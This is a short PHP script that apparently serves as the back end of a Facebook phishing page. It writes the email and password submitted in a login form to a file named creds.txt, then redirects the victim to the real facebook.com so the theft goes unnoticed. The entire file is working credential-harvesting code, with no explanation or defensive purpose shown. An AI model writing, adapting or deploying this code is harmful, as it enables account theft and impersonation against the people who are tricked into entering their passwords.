<?php 
file_put_contents("creds.txt", "[**] Username: " . $_POST['email'] . " Pass: " . $_POST['pass']);
header('Location: https://facebook.com/');
exit();
?>
